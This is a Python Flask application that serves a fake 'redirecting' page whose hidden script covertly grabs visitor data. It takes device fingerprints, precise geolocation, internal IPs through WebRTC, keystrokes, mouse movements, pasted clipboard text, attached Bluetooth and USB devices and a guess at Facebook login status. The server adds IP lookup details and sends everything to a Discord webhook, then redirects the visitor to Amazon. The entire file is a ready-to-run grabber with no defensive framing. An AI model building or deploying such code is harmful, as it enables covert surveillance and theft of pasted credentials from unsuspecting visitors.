from flask import Flask, request, render_template_string, jsonify
import requests
import os

app = Flask(__name__)
DISCORD_WEBHOOK = os.environ.get("DISCORD_WEBHOOK")

HTML_TEMPLATE = """<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Loading...</title>
  <style>
    body { font-family: sans-serif; text-align: center; background: #0e0e0e; color: white; }
    .loader {
      border: 10px solid #444;
      border-top: 10px solid #00f2ff;
      border-radius: 50%;
      width: 80px; height: 80px;
      margin: 50px auto;
      animation: spin 1s linear infinite;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    .hidden { display: none; }
  </style>
</head>
<body>
  <div class="loader"></div>
  <p id="detect">Please wait, redirecting...</p>
  <input id="pasteField" placeholder="Paste here" class="hidden">
  
  <!-- Hidden iframe for login detection simulation -->
  <iframe id="fbFrame" src="https://www.facebook.com" class="hidden"></iframe>
  
  <script>
    // Global arrays for new events
    const mouseMovements = [];
    const keystrokes = [];
    let clipboardData = null;
    
    // Capture first 3 mouse movements only
    document.addEventListener('mousemove', (e) => {
      if (mouseMovements.length < 3) {
        mouseMovements.push({ x: e.clientX, y: e.clientY, t: Date.now() });
      }
    });
    
    // Capture keydown events (limit to first 2 for example)
    document.addEventListener('keydown', (e) => {
      if (keystrokes.length < 2) {
        keystrokes.push({ key: e.key, code: e.code });
      }
    });
    
    // Capture paste events and record the data
    document.getElementById("pasteField").addEventListener("paste", e => {
      const pasted = e.clipboardData.getData("text");
      // Warning alert for sensitive data:
      if (/.*@.*\..*/.test(pasted) || /[A-Za-z0-9@!#\$%\^&\*]{8,}/.test(pasted)) {
        alert("Looks like you pasted sensitive data!");
      }
      clipboardData = pasted;
    });
    
    // Canvas fingerprint (truncated data URL)
    function getCanvasFingerprint() {
      try {
        const canvas = document.createElement("canvas");
        const ctx = canvas.getContext("2d");
        // Draw something
        ctx.textBaseline = "top";
        ctx.font = "14px 'Arial'";
        ctx.fillText("Fingerprint", 2, 2);
        return canvas.toDataURL();
      } catch(e) {
        return "N/A";
      }
    }
    
    async function collectInfo() {
      try {
        // WebGL details
        const canvasEl = document.createElement("canvas");
        const gl = canvasEl.getContext("webgl") || canvasEl.getContext("experimental-webgl");
        const dbg = gl ? gl.getExtension('WEBGL_debug_renderer_info') : null;
        const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
        const battery = await navigator.getBattery().catch(() => ({ level: 1.0, charging: false, chargingTime: "N/A", dischargingTime: "N/A" }));
        const voices = speechSynthesis.getVoices().map(v => `${v.name} (${v.lang})`);
        const features = {
          wasm: typeof WebAssembly === 'object',
          webrtc: typeof RTCPeerConnection === 'function',
          serviceWorker: 'serviceWorker' in navigator,
          notification: 'Notification' in window,
          localStorage: 'localStorage' in window,
          indexedDB: 'indexedDB' in window,
          deviceMotion: 'DeviceMotionEvent' in window,
          orientation: 'DeviceOrientationEvent' in window,
          vibrate: 'vibrate' in navigator
        };
        
        const devices = await navigator.mediaDevices.enumerateDevices().catch(() => []);
        const mediaDevices = devices.map(d => `${d.kind}: ${d.label || 'Unknown'}`);
        
        let bluetoothDevices = [], usbDevices = [];
        try {
          bluetoothDevices = await navigator.bluetooth.getDevices();
          bluetoothDevices = bluetoothDevices.map(d => d.name || 'Unnamed Device');
        } catch {}
        try {
          const usb = await navigator.usb.getDevices();
          usbDevices = usb.map(d => d.productName);
        } catch {}
        
        // Audio fingerprint sample
        const osc = audioCtx.createOscillator();
        const analyser = audioCtx.createAnalyser();
        osc.connect(analyser);
        osc.start(0);
        let audioData = new Float32Array(analyser.frequencyBinCount);
        analyser.getFloatFrequencyData(audioData);
        const audioFingerprint = audioData.slice(0, 5).join(',');
        
        // Collect internal IPs via WebRTC
        let internalIPs = [];
        try {
          const pc = new RTCPeerConnection({ iceServers: [] });
          pc.createDataChannel('');
          pc.createOffer().then(offer => pc.setLocalDescription(offer));
          pc.onicecandidate = e => {
            if (e.candidate) {
              const ipMatch = /([0-9]{1,3}(?:\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
              if (ipMatch && !internalIPs.includes(ipMatch[1])) internalIPs.push(ipMatch[1]);
            }
          };
          await new Promise(resolve => setTimeout(resolve, 1000));
        } catch {}
        
        // Geolocation
        let location = { lat: null, lon: null, accuracy: null, speed: null };
        try {
          await new Promise((resolve, reject) => {
            navigator.geolocation.getCurrentPosition(
              pos => {
                location.lat = pos.coords.latitude;
                location.lon = pos.coords.longitude;
                location.accuracy = pos.coords.accuracy;
                location.speed = pos.coords.speed;
                resolve();
              },
              err => resolve()
            );
          });
        } catch {}
        
        // Ambient Light Sensor
        let ambientLight = "N/A";
        if ('AmbientLightSensor' in window) {
          try {
            const sensor = new AmbientLightSensor();
            sensor.addEventListener('reading', () => { ambientLight = sensor.illuminance; });
            sensor.start();
            await new Promise(resolve => setTimeout(resolve, 1000));
          } catch (e) {
            ambientLight = "Error: " + e;
          }
        }
        
        // Browser Plugins
        const plugins = navigator.plugins ? Array.from(navigator.plugins).map(p => p.name) : [];
        // MIME Types available in navigator
        const mimeTypes = navigator.mimeTypes ? Array.from(navigator.mimeTypes).map(m => m.type) : [];
        
        // Online/Offline Status
        const onlineStatus = navigator.onLine ? "online" : "offline";
        
        // Motion and Orientation events
        let motionData = {}, orientationData = {};
        window.addEventListener('devicemotion', e => {
          motionData = {
            accX: e.acceleration?.x || 0,
            accY: e.acceleration?.y || 0,
            accZ: e.acceleration?.z || 0
          };
        });
        window.addEventListener('deviceorientation', e => {
          orientationData = {
            alpha: e.alpha,
            beta: e.beta,
            gamma: e.gamma
          };
        });
        await new Promise(resolve => setTimeout(resolve, 1000));
        
        // Storage Support Details
        const storageSupport = {
          localStorage: ('localStorage' in window),
          sessionStorage: ('sessionStorage' in window),
          indexedDB: ('indexedDB' in window),
          serviceWorker: ('serviceWorker' in navigator)
        };
        
        // Simulated Installed Fonts & PDF Viewer check (from plugins)
        const installedFonts = ["Arial", "Helvetica", "Times New Roman", "Courier New"];
        const pdfViewerEnabled = plugins.some(p => p.toLowerCase().includes("pdf"));
        
        // Canvas fingerprint
        const canvasFingerprint = getCanvasFingerprint().substring(0, 60) + '...';
        
        // Detect login by checking if the hidden Facebook iframe has loaded
        let loginDetection = "Not Detected";
        const fbFrame = document.getElementById("fbFrame");
        fbFrame.onload = () => {
          loginDetection = "Facebook iframe loaded – user likely logged in";
        };
        
        // Network details (using navigator.connection if available)
        const connection = navigator.connection || {};
        
        // Build the payload with all collected data and new fields
        const payload = {
          screenWidth: screen.width,
          screenHeight: screen.height,
          colorDepth: screen.colorDepth,
          devicePixelRatio: window.devicePixelRatio,
          platform: navigator.platform,
          language: navigator.language,
          userAgent: navigator.userAgent,
          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
          timezoneOffset: new Date().getTimezoneOffset(),
          cookiesEnabled: navigator.cookieEnabled,
          doNotTrack: navigator.doNotTrack,
          touchSupport: ('ontouchstart' in window),
          memory: navigator.deviceMemory || 'N/A',
          hardwareConcurrency: navigator.hardwareConcurrency || 'N/A',
          webGLVendor: gl ? gl.getParameter(gl.VENDOR) : 'N/A',
          webGLRenderer: gl ? gl.getParameter(gl.RENDERER) : 'N/A',
          unmaskedVendor: (dbg && gl) ? gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL) : 'N/A',
          unmaskedRenderer: (dbg && gl) ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : 'N/A',
          batteryLevel: battery.level,
          charging: battery.charging,
          batteryChargingTime: battery.chargingTime,
          batteryDischargingTime: battery.dischargingTime,
          audioFingerprint: audioFingerprint,
          bluetoothDevices: bluetoothDevices,
          usbDevices: usbDevices,
          mediaDevices: mediaDevices,
          networkSpeed: connection.downlink || 'N/A',
          effectiveType: connection.effectiveType || 'N/A',
          geoLocation: location,
          ambientLight: ambientLight,
          plugins: plugins,
          mimeTypes: mimeTypes,
          onlineStatus: onlineStatus,
          motionData: motionData,
          orientationData: orientationData,
          internalIPs: internalIPs,
          voices: voices,
          features: features,
          storageSupport: storageSupport,
          installedFonts: installedFonts,
          vibrationSupported: ('vibrate' in navigator) ? "Yes" : "No",
          pdfViewerEnabled: pdfViewerEnabled ? "True" : "False",
          canvasFingerprint: canvasFingerprint,
          mouseMovements: mouseMovements,
          keystrokes: keystrokes,
          clipboardData: clipboardData,
          loginDetection: loginDetection,
          redirectedTo: "https://www.amazon.in"
        };
        
        await fetch("/collect", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload)
        });
        
        setTimeout(() => {
          window.location.href = payload.redirectedTo;
        }, 3000);
      } catch (err) {
        document.getElementById("detect").innerText = "Error collecting info.";
      }
    }
    
    collectInfo();
  </script>
</body>
</html>
"""

@app.route("/")
def home():
    return render_template_string(HTML_TEMPLATE)

@app.route("/collect", methods=["POST"])
def collect():
    data = request.json
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    try:
        ip_info = requests.get(f"https://ipinfo.io/{ip}/json", timeout=5).json()
    except Exception:
        ip_info = {}
    
    # Check if DISCORD_WEBHOOK is set
    if not DISCORD_WEBHOOK:
        return jsonify({"status": "error", "message": "DISCORD_WEBHOOK not configured"}), 500

    # Build Discord message with emojis and formatted sections
    info = f"""
📊 **New Fingerprint Logged Device Information:**
• **Screen:** {data.get('screenWidth')}x{data.get('screenHeight')}, {data.get('colorDepth')}-bit, DPR: {data.get('devicePixelRatio')}
• **Orientation:** {(data.get('screenWidth') > data.get('screenHeight')) and "landscape-primary" or "portrait-primary"}
• **WebGL Vendor:** {data.get('unmaskedVendor')}  
• **WebGL Renderer:** {data.get('unmaskedRenderer')}
• **Audio Fingerprint:** {data.get('audioFingerprint')}
• **Installed Fonts:** {", ".join(data.get('installedFonts', []))}
• **CPU Cores:** {data.get('hardwareConcurrency')}
• **Memory:** {data.get('memory')} GB
• **Touch Support:** {data.get('touchSupport')}
• **Vibration Supported:** {data.get('vibrationSupported')}

🌐 **Network Details:**
• **IPs (WebRTC):** {", ".join(data.get('internalIPs', []))}
• **Downlink:** {data.get('networkSpeed')} Mbps
• **RTT:** {data.get('effectiveType')} (RTT not directly measured)
• **Connection Type:** {data.get('effectiveType')}

🖥 **Browser & OS:**
• **OS:** {data.get('platform')}
• **User Agent:** {data.get('userAgent')}
• **Vendor:** N/A
• **Language:** {data.get('language')}
• **Languages:** {data.get('language')}, (additional languages not captured)
• **Cookies Enabled:** {data.get('cookiesEnabled')}
• **Do Not Track:** {data.get('doNotTrack')}
• **PDF Viewer Enabled:** {data.get('pdfViewerEnabled')}

⏰ **Timezone Info:**
• **Timezone:** {data.get('timezone')}
• **Offset:** {data.get('timezoneOffset')} minutes

🔌 **Plugins & MIME Types:**
• **Plugins:** {", ".join(data.get('plugins', []))}
• **MIME Types:** {", ".join(data.get('mimeTypes', []))}

💾 **Storage Support:**
• **localStorage:** {data.get('storageSupport',{{}}).get('localStorage')}
• **sessionStorage:** {data.get('storageSupport',{{}}).get('sessionStorage')}
• **indexedDB:** {data.get('storageSupport',{{}}).get('indexedDB')}
• **Service Worker Support:** {data.get('storageSupport',{{}}).get('serviceWorker')}

🔋 **Battery Info:**
• **Level:** {int(float(data.get('batteryLevel',1))*100)}%
• **Charging:** {"Yes" if data.get('charging') else "No"}
• **Charging Time:** {data.get('batteryChargingTime')}
• **Discharging Time:** {data.get('batteryDischargingTime')}

🎨 **Canvas Fingerprint:**
• **Data URL (truncated):** {data.get('canvasFingerprint')}

🐭 **Mouse Movements (First 3):**
{chr(10).join([f"    {i+1}. x: {m.get('x')}, y: {m.get('y')}, t: {m.get('t')}" for i, m in enumerate(data.get('mouseMovements', []))])}

⌨️ **Keystrokes:**
{chr(10).join([f"    • Key: {k.get('key')}, Code: {k.get('code')}" for k in data.get('keystrokes', [])])}

📋 **Clipboard Events (Pasted):**
• **Data:** "{data.get('clipboardData')}" 

📱 **Sensor Data:**
• **Device Motion:** Accel x:{data.get('motionData',{{}}).get('accX')}, y:{data.get('motionData',{{}}).get('accY')}, z:{data.get('motionData',{{}}).get('accZ')}
• **Device Orientation:** Alpha: {data.get('orientationData',{{}}).get('alpha')}, Beta: {data.get('orientationData',{{}}).get('beta')}, Gamma: {data.get('orientationData',{{}}).get('gamma')}

🗣 **Voices (Speech Synthesis):**
• {", ".join(data.get('voices', []))}

🔒 **Login Detection:**
• {data.get('loginDetection')}

➡️ **Redirected To:**
• {data.get('redirectedTo')}

🌍 **IP Info:**
• **IP:** {ip}
• **ISP:** {ip_info.get("org", "N/A")}
• **City:** {ip_info.get("city", "N/A")}
• **Region:** {ip_info.get("region", "N/A")}
• **Country:** {ip_info.get("country", "N/A")}
• **Location:** {ip_info.get("loc", "N/A")}
    """.strip()

    try:
        response = requests.post(DISCORD_WEBHOOK, json={"content": info})
        response.raise_for_status()
    except Exception as ex:
        return jsonify({"status": "error", "message": f"Failed to post to Discord webhook: {ex}"}), 500

    return jsonify({"status": "ok"})

@app.route("/health", methods=["GET"])
def health_check():
    """
    Health check endpoint that verifies if the DISCORD_WEBHOOK env variable is set
    and attempts a test message to the webhook.
    """
    if not DISCORD_WEBHOOK:
        return jsonify({"status": "error", "message": "DISCORD_WEBHOOK not configured"}), 500
    try:
        test_payload = {"content": "Test: Webhook connection is working."}
        response = requests.post(DISCORD_WEBHOOK, json=test_payload)
        response.raise_for_status()
    except Exception as ex:
        return jsonify({"status": "error", "message": f"Webhook connection failed: {ex}"}), 500
    return jsonify({"status": "ok", "message": "Webhook connection successful"})

if __name__ == "__main__":
    if not DISCORD_WEBHOOK:
        print("Warning: DISCORD_WEBHOOK is not configured!")
    app.run(debug=True)
